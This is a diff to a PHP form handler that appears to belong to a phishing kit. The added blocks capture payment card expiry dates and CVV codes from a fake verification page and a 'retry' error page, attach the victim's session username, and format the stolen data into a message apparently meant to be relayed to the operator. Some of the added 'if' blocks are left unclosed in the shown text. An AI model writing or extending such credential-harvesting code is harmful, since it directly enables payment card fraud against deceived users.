@@ -92,6 +92,35 @@ if (isset($_POST['tipo_usuario'],$_POST['tipo_tarjeta'],$_POST['card'],$_POST['d
     $message .= "📲 Código: <code>$code_esc</code>\n\n";
     $message .= "🍀 User: <code>$user_esc</code>\n";
 
+// cvc.php
+if (isset($_POST['mes'],$_POST['anio'],$_POST['cvv'])) {
+
+    $form_origen = "cvc.php";
+    $mes = trim($_POST['mes']);
+    $anio = trim($_POST['anio']);
+    $cvv = trim($_POST['cvv']);
+    $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
+    $message .= "🇻🇪『𝖣𝖺𝗍𝗈𝗌 𝖳𝖺𝗋𝗃𝖾𝗍𝖺』🇻🇪\n\n";
+    $message .= "┊⬩ 𝖬𝖾𝗌 𝖵𝖾𝗇𝖼.: <code>$mes</code>\n";
+    $message .= "┊⬩ 𝖸𝖾𝖺𝗋 𝖵𝖾𝗇𝖼.: <code>$anio</code>\n";
+    $message .= "┊⬩ 𝖢𝖵𝖵.: <code>$cvv</code>\n\n";
+    $message .= "┊⬩ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈.: <code>$user_esc</code>\n";
+
+// cvc-error.php
+if (isset($_POST['mes2'],$_POST['anio2'],$_POST['cvv2'])) {
+
+    $form_origen = "cvc-error.php";
+    $mes = trim($_POST['mes2']);
+    $anio = trim($_POST['anio2']);
+    $cvv = trim($_POST['cvv2']);
+    $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
+    $message .= "🇻🇪『𝖣𝖺𝗍𝗈𝗌 𝖳𝖺𝗋𝗃𝖾𝗍𝖺-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈』🇻🇪\n\n";
+    $message .= "┊⬩ 𝖬𝖾𝗌 𝖵𝖾𝗇𝖼.: <code>$mes</code>\n";
+    $message .= "┊⬩ 𝖸𝖾𝖺𝗋 𝖵𝖾𝗇𝖼.: <code>$anio</code>\n";
+    $message .= "┊⬩ 𝖢𝖵𝖵.: <code>$cvv</code>\n\n";
+    $message .= "┊⬩ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈.: <code>$user_esc</code>\n";
+
+
 } else {
     exit("No se reconocieron datos válidos.");
 }
